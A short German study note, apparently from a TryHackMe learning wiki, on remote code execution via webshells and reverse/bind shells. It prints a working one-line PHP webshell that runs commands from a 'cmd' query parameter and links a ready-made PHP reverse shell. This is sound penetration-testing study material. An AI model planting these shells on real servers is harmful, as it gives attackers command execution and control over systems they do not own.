# REC − Remote Code Execution
Angelegt Mittwoch 07 Dezember 2022


* Zwei Möglichkeiten bei Webserver:
	1. Webshell (man gibt Shell-Befehle per GET-Parameter (bspw. per Query-Parameter) ein)
	2. [:Linux:TryHackMe:**Reverse & Bind Shells**](./Reverse_&_Bind_Shells.md) (ist besser als eine Webshell aber nicht immer möglich)
	* Von einer Web-Shell kommt man zu einer *Reverse/Bind-Shell* indem man in der hochgeladenen Datei die entsprechenden Befehle zum Verbindungsaufbau setzt.

Oder man nutzt eine fertige Version: <https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php> (noch IP und Port setzen)
	
ad 1.

* Falls Server mit PHP betrieben wird, kann man probieren folgendes PHP-Skript hochzuladen und ``.../php-skript.php?cmd=BEFEHL-1;…;BEFEHL-n`` aufrufen

	<?php
	    echo system($_GET["cmd"]);
	?>
			

* ``$_GET[STRING]`` liest Query-Parameter ``cmd`` ein
* ``system(…)`` übergibt Argument ans System


* Das funktioniert deswegen, weil beim Aufruf von ``…/php-skript.php`` der Inhalt der Datei angefragt und dargestellt werden soll. Beim Einlesen wird die Datei automatisch ausgeführt, hier eben das in HTML-Tags stehende PHP-Skript.



